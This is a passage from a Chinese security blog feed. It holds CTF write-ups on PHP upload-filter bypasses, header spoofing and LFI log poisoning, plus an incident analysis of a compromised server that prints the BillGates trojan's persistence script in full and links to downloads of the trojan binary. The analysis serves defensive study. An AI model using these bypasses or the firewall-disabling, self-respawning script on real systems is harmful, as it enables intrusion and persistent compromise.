substring(filename,10,10) from(select filename from picture limit 0,1)x))#</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$db</span>-&gt;insert(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>], getip(), <span class="variable">$newname</span>)) &#123;</span><br><span class="line">            header(<span class="string">&#x27;location: index.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="checkMIME"><a href="#checkMIME" class="headerlink" title="checkMIME()"></a>checkMIME()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkMIME</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// text/php text/x-php</span></span><br><span class="line">    <span class="variable">$php_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;text/php&quot;</span>, <span class="string">&quot;text/x-php&quot;</span>);</span><br><span class="line">    <span class="variable">$type</span> = mime_content_type(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(strtolower(<span class="variable">$type</span>), <span class="variable">$php_ext</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;i need php file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="checkContent"><a href="#checkContent" class="headerlink" title="checkContent()"></a>checkContent()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkContent</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos(<span class="variable">$content</span>, <span class="string">&#x27;&lt;?&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="checkExts"><a href="#checkExts" class="headerlink" title="checkExts()"></a>checkExts()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkExts</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$AllowedExt</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;inc&#x27;</span>);</span><br><span class="line">    <span class="variable">$filename</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span> (in_array(strtolower(<span class="variable">$filename</span>[count(<span class="variable">$filename</span>) - <span class="number">1</span>]), <span class="variable">$AllowedExt</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    checkMIME(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span> (checkContent(<span class="variable">$content</span>) &amp;&amp; checkExts(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">        upload(<span class="variable">$file</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;attack detected&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file not found&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="如何绕过checkMIME-？"><a href="#如何绕过checkMIME-？" class="headerlink" title="如何绕过checkMIME()？"></a>如何绕过<code>checkMIME()</code>？</h2><p>我们先了解下<a href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html#3mime-type">p牛的博客-&gt;mime-type</a></p><p>首先我们上传的文件一定要是php文件，因为<code>checkMIME()</code>的<code>mime_content_type()</code> 检测文件名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php的fileinfo扩展是通过文件内容来猜测文件的mime type，我们传入的文件，只要前几个字符是&lt;?php，那么就会返回text/x-php</span><br></pre></td></tr></table></figure><p><code>checkContent()</code>检测文件的首次出现的是否为<code>&lt;?</code>，如果检测到就会判定是<code>attack</code>。</p><h2 id="如何绕过checkContent-？"><a href="#如何绕过checkContent-？" class="headerlink" title="如何绕过checkContent()？"></a>如何绕过<code>checkContent()</code>？</h2><ul><li>利用windows下的BOM 。</li></ul><p><code>BOM头的文件</code>，文件头3个字符就是\xef\xbb\xbf，就不是<code>&lt;?</code>了。</p><p>而fileinfo仍然会判断这个文件是text/x-php，从而绕过<code>checkContent()</code>检测.</p><ul><li>利用<code>#!/usr/bin/php</code>  </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/php 是告诉操作系统执行这个脚本的时候，调用/usr/bin下的php解释器；</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env php 这种用法是为了防止操作系统用户没有将php装在默认的/usr/bin路径里。当系统看到这一行的时候，首先会到env设置里查找php的安装路径，再调用对应路径下的解释器程序完成操作。</span><br><span class="line"></span><br><span class="line">#!/usr/bin/php 相当写死了php路径;</span><br><span class="line">#!/usr/bin/env php 会去环境设置寻找php目录。</span><br></pre></td></tr></table></figure><h2 id="如何绕过checkExts-？"><a href="#如何绕过checkExts-？" class="headerlink" title="如何绕过checkExts()？"></a>如何绕过<code>checkExts()</code>？</h2><p>在php文件名后加<code>空格</code>,<code>\t</code>,<code>\n</code>,<code>\r</code>,<code>\0</code>,<code>\x0B</code>可绕过<code>checkExts()</code>检测。</p><p>即类似于：<code>filename.php </code>(.php%20)</p><p>在后面的<code>upload()</code>函数里有<code>trim()</code>会去掉空白字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符：</span><br><span class="line"></span><br><span class="line">    &quot; &quot; (ASCII 32 (0x20))，普通空格符。</span><br><span class="line">    &quot;\t&quot; (ASCII 9 (0x09))，制表符。</span><br><span class="line">    &quot;\n&quot; (ASCII 10 (0x0A))，换行符。</span><br><span class="line">    &quot;\r&quot; (ASCII 13 (0x0D))，回车符。</span><br><span class="line">    &quot;\0&quot; (ASCII 0 (0x00))，空字节符。</span><br><span class="line">    &quot;\x0B&quot; (ASCII 11 (0x0B))，垂直制表符。</span><br></pre></td></tr></table></figure><p>空格<br><img src="/image/1/00.png" alt="空格"></p><p>换行<br><img src="/image/1/n.png" alt="换行"></p><p>空字节符<br><img src="/image/1/0.png" alt="空字节符"></p><p>垂直制表符：<br><img src="/image/1/x0b.png" alt="垂直制表符"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;py到出题人的说明：&quot;&gt;&lt;a href=&quot;#py到出题人的说明：&quot; class=&quot;headerlink&quot; title=&quot;py到出题人的说明：&quot;&gt;&lt;/a&gt;py到出题人的说明：&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;tabl</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://cr4ckm3.top/tags/CTF/"/>
    
    <category term="php" scheme="https://cr4ckm3.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>2018红帽杯Web部分wp</title>
    <link href="https://cr4ckm3.top/2018/05/01/2018%E7%BA%A2%E5%B8%BD%E6%9D%AF/"/>
    <id>https://cr4ckm3.top/2018/05/01/2018%E7%BA%A2%E5%B8%BD%E6%9D%AF/</id>
    <published>2018-05-01T00:30:54.000Z</published>
    <updated>2019-08-30T10:00:44.733Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Simple-Upload"><a href="#Simple-Upload" class="headerlink" title="Simple Upload"></a>Simple Upload</h1><p>打开首页burp拦截发现<code>admin=0</code>,尝试修改为<code>admin=1</code></p><p><img src="/image/simple_upload/index.png" alt="admin=0"></p><p>然后发现跳转到<code>upload.html</code>页面</p><p><img src="/image/simple_upload/upload.png" alt="upload.html"></p><p>经尝试，只允许上传<code>jpg/png</code>类型文件。以及收集到系统为<code>linux</code>,Web中间件为<code>Apache Tomcat</code>。</p><p>因此大致思路已经清晰：</p><ul><li>apache文件名截断漏洞</li><li>apache解析漏洞</li><li>修改Content-Type</li><li>图片马</li></ul><p>最终可以通过的是修改<code>Content-Type</code>为<code>image/jpeg</code>即可上传任意文件。</p><p>这里有一处比较需要注意的就是，上传的php并没有作用。但需要注意的是，中间件是<code>Apache Tomcat</code>，所以尝试上传jsp大马。</p><p><img src="/image/simple_upload/jsp.png" alt="jsp.png"></p><p>上传成功且解析！</p><p>最终根目录拿到flag</p><p><img src="/image/simple_upload/flag.png" alt="flag.png"></p><h1 id="Shopping-Log"><a href="#Shopping-Log" class="headerlink" title="Shopping Log"></a>Shopping Log</h1><ul><li><code>http://123.59.141.153/</code>或者<code>http://120.132.95.234/</code></li></ul><p>这道题没什么意思，前面几步都是照实验吧上的题来改的，旧题新出，然后最后一步就是MD5爆破+4位订单号爆破，实在是 🐄</p><p>打开一片空白，只有一句注释<code>&lt;!-- Site is tmvb.com --&gt;</code></p><p>于是终于有机会看到群上面各位大佬的社工了😄</p><p>正确做法：</p><ul><li>修改<code>hosts</code>文件指向<code>www.tmvb.com</code>然后就可以看到：</li></ul><p><img src="/image/shopping_log/index.png" alt="index.png"></p><ul><li>设置 <code>referer:www.dww.com</code> 绕过第一步</li></ul><p><img src="/image/shopping_log/1.png" alt="1.png"></p><ul><li>设置 <code>Accept-Language: ja</code> 绕过第二步</li></ul><p>参考资料：<a href="http://www.lingoes.cn/zh/translator/langcode.htm">Language Code Table</a></p><p><code>Japan sales only</code> 意思差不多就是要来自日本。绕过思路：修改<code>Accept-Language</code>或<code>X-Forwarded-For</code>绕过</p><p><img src="/image/shopping_log/2.png" alt="2.png"></p><ul><li>然后页面会跳转定向到一个订单查询页面</li></ul><p><img src="/image/shopping_log/3.png" alt="3.png"></p><ul><li>4位订单号爆破+MD5验证码爆破</li></ul><p>这一步太坑，最后爆破出的订单号就是<code>9588</code>，队里几个人跑了一下午。。。</p><p><img src="/image/shopping_log/4.png" alt="4.png"></p><p><img src="/image/shopping_log/5.png" alt="5.png"></p><p>脚本的话就不贴了，需要的话在网上也是可以找到的，实在找不到再找我。</p><h1 id="guess-id"><a href="#guess-id" class="headerlink" title="guess id"></a>guess id</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">emmmmmmmmmmm,这道题可能是为了防止大佬ak,所以没人做出来，等官方WP</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="biubiubiu"><a href="#biubiubiu" class="headerlink" title="biubiubiu"></a>biubiubiu</h1><p>听说解出来的大多数都是非预期的做法。<code>文件包含+access.log解析</code>getshell</p><p>然而预期的做法是<code>ssrf+gopher</code></p><p>这道题比较接近实战。</p><p>下面讲下非预期的做法：</p><ul><li>文件包含</li></ul><p><code>http://08f43db931ee48ef984062844dcc216747512e8278834ba7.game.ichunqiu.com/index.php?page=../../../../../../etc/passwd</code></p><ul><li>nginx的access.log日志处可随意构造写入</li></ul><p><code>../../../../../../var/log/nginx/access.log</code></p><p><img src="/image/biubiubiu/UA.png" alt="UA"></p><p><img src="/image/biubiubiu/1.png" alt="1.png"></p><p><img src="/image/biubiubiu/shell.png" alt="shell"></p><ul><li>写的shell,能解析，但是服务器有类似狗之类的防菜刀，师傅都是用的过狗。</li></ul><p>剩下的事就是翻flag</p><p><img src="/image/biubiubiu/flag.png" alt="flag"></p><p>预期做法等官方WP</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Simple-Upload&quot;&gt;&lt;a href=&quot;#Simple-Upload&quot; class=&quot;headerlink&quot; title=&quot;Simple Upload&quot;&gt;&lt;/a&gt;Simple Upload&lt;/h1&gt;&lt;p&gt;打开首页burp拦截发现&lt;code&gt;admin=0&lt;</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://cr4ckm3.top/tags/writeup/"/>
    
    <category term="CTF" scheme="https://cr4ckm3.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>一次被入侵后的服务器的分析</title>
    <link href="https://cr4ckm3.top/2018/04/28/BillGates/"/>
    <id>https://cr4ckm3.top/2018/04/28/BillGates/</id>
    <published>2018-04-28T12:00:00.000Z</published>
    <updated>2019-08-30T10:00:42.843Z</updated>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>早上老大，发来一个任务，说联系下某服务器负责人，看下服务器什么情况。</p><h1 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h1><p>负责人描述:</p><ul><li>发现莫名被创建新用户</li><li>出现异常流量，且达到14个G</li><li>27日三个时间段出现异常ip登录</li><li>对外开放22、80、5001端口</li><li>部分日志丢失</li></ul><p>5001端口为app服务器数据接口</p><h1 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h1><p>拿到账号登录进去，首先要明确能做什么和要做什么。<br>随便看了下，部署的网站应用是用root权限<br>查看进程<code>ps -aux</code>发现并没有什么进程运行<br>另外，觉得敲命令运行很卡顿，且常常卡死，掉线。所以<code>top</code>命令查看，发现某进程sysxlv占用104%的cpu，问题很大。<br>询问管理员后，是不属于他们的应用。<br>那么就发现了问题所在。</p><h1 id="进一步寻找"><a href="#进一步寻找" class="headerlink" title="进一步寻找"></a>进一步寻找</h1><p>用黑客的视角与思考方式，假如我是攻击者，我会做些什么维护自己的权限？这也是渗透过程中属于后渗透阶段重要的一部分。<br>如何维权</p><ul><li>留后门</li><li>不死内存马</li><li>定时脚本</li><li>启动任务</li></ul><h1 id="BillGates木马"><a href="#BillGates木马" class="headerlink" title="BillGates木马"></a>BillGates木马</h1><p>发现该脚本是在<code>/etc/rc.d/rc.local</code>文件下有两条自启任务:</p><p><img src="/image/muma/rc.local.jpg" alt="re.local.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">touch /var/lock/subsys/<span class="built_in">local</span></span><br><span class="line">sh /etc/jourxlv &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>jourxlv</code>脚本如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment">#Welcome like-minded friends to come to exchange.</span></span><br><span class="line"><span class="comment">#We are a group of people who have a dream.</span></span><br><span class="line"><span class="comment">#                by:sysxlj</span></span><br><span class="line"><span class="comment">#                2016-03-10</span></span><br><span class="line">service iptables stop &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">host_dir=`<span class="built_in">pwd</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;sh <span class="variable">$host_dir</span>/jourxlv &amp;&quot;</span> = <span class="string">&quot;<span class="subst">$(cat /etc/rc.local | grep $host_dir/jourxlv | grep -v grep)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;sh <span class="variable">$host_dir</span>/jourxlv &amp;&quot;</span> &gt;&gt; /etc/rc.local</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">cp sysxlj /usr/bin/aher</span><br><span class="line">cp jourxlv /usr/bin/keudl</span><br><span class="line"><span class="keyword">while</span> [ 1 ]; <span class="keyword">do</span></span><br><span class="line">    Centos_sshd_killn=$(ps aux | grep <span class="string">&quot;<span class="variable">$host_dir</span>/sysxlj&quot;</span> | grep -v grep | wc -l)</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$Centos_sshd_killn</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$host_dir</span>/sysxlj&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">if</span> [ -f <span class="string">&quot;/usr/bin/aher&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                cp /usr/bin/aher <span class="variable">$host_dir</span>/sysxlj</span><br><span class="line">                chmod 755 ./sysxlj</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;No weeget&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        ./sysxlj &amp;</span><br><span class="line">    <span class="keyword">elif</span> [[ <span class="variable">$Centos_sshd_killn</span> -gt 1 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">for</span> killed <span class="keyword">in</span> $(ps aux | grep <span class="string">&quot;<span class="variable">$host_dir</span>/sysxlj&quot;</span> | grep -v grep | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>); <span class="keyword">do</span></span><br><span class="line">            Centos_sshd_killn=$((<span class="variable">$Centos_sshd_killn</span>-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">if</span> [[ <span class="variable">$Centos_sshd_killn</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">continue</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">kill</span> -9 <span class="variable">$killed</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    Centos_ssh_killn=$(ps aux | grep <span class="string">&quot;<span class="variable">$host_dir</span>/jourxlv&quot;</span> | grep -v grep | wc -l)</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$Centos_ssh_killn</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$host_dir</span>/jourxlv&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">if</span> [ -f <span class="string">&quot;/usr/bin/keudl&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                cp /usr/bin/keudl <span class="variable">$host_dir</span>/jourxlv</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;No weeget&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="variable">$host_dir</span>/jourxlv &amp;</span><br><span class="line">    <span class="keyword">elif</span> [[ <span class="variable">$Centos_ssh_killn</span> -gt 1 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">for</span> killed <span class="keyword">in</span> $(ps aux | grep <span class="string">&quot;<span class="variable">$host_dir</span>/jourxlv&quot;</span> | grep -v grep | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>); <span class="keyword">do</span></span><br><span class="line">            Centos_ssh_killn=$((<span class="variable">$Centos_ssh_killn</span>-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">if</span> [[ <span class="variable">$Centos_ssh_killn</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">continue</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">kill</span> -9 <span class="variable">$killed</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    sleep 600</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后大概初略的看了一下，发现脚本大概操作就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">service iptables stop &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;sh <span class="variable">$host_dir</span>/jourxlv &amp;&quot;</span> &gt;&gt; /etc/rc.local</span><br><span class="line">cp sysxlj /usr/bin/aher</span><br><span class="line">cp jourxlv /usr/bin/keudl</span><br><span class="line">cp /usr/bin/keudl <span class="variable">$host_dir</span>/jourxlv</span><br><span class="line">cp /usr/bin/aher <span class="variable">$host_dir</span>/sysxlj</span><br><span class="line">chmod 755 ./sysxlj</span><br><span class="line"><span class="built_in">kill</span> -9 <span class="variable">$killed</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>关闭防火墙</li><li>写自启任务</li><li>木马自我复制</li><li>脚本自我复制</li><li>加权限运行</li><li>kill防止启动多个实例</li></ul><p>所以一看，关防火墙就没什么好事了，就跟着复制目录查看，果然发现<code>aher</code><a href="https://pan.baidu.com/s/12boYMeMA0UckrLxGaVHBqw">百度盘链接 密码:wjbq</a>:ELF开头的linux可执行木马程序 。<code>keudl</code><a href="https://pan.baidu.com/s/12e6H9sk_ksV50mTi6OrMqw">百度盘链接 密码:5yrt</a>:就是上面的脚本。</p><h1 id="木马分析"><a href="#木马分析" class="headerlink" title="木马分析"></a>木马分析</h1><p><code>aher</code>拿到<a href="https://www.virustotal.com/">virustotal</a>上分析：</p><h2 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h2><p><img src="/image/muma/virustotal.png" alt="virustotal.png"></p><p>多数报木马、后门、DDos,少数报绿色。。。</p><h2 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Basic Properties:</span><br><span class="line"></span><br><span class="line">MD5:cb49f9c981bd54d9c67770039a02c383</span><br><span class="line">SHA-1:0fee66a1f81e5b924edd593a8f76c9ec424bb668</span><br><span class="line">File Type:ELF</span><br><span class="line">Magic:ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.2.5, not stripped</span><br><span class="line">SSDeep:24576:e845rGHu6gVJKG75oFpA0VWeX4Z2y1q2rJp0:745vRVJKGtSA0VWeoAu9p0</span><br><span class="line">TRiD:ELF Executable and Linkable format (Linux) (50.1%)</span><br><span class="line">ELF Executable and Linkable format (generic) (49.8%)</span><br><span class="line">File Size:1.17 MB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Tags:</span><br><span class="line"></span><br><span class="line">elf</span><br><span class="line"></span><br><span class="line">History:</span><br><span class="line"></span><br><span class="line">First Seen In The Wild:2010-11-20 23:29:33</span><br><span class="line">First Submission:2018-04-11 18:03:21</span><br><span class="line">Last Submission:2018-04-29 13:26:11</span><br><span class="line">Last Analysis:2018-04-29 13:26:11</span><br><span class="line">File Names:</span><br><span class="line">cb49f9c981bd54d9c67770039a02c383</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Behavior"><a href="#Behavior" class="headerlink" title="Behavior"></a>Behavior</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 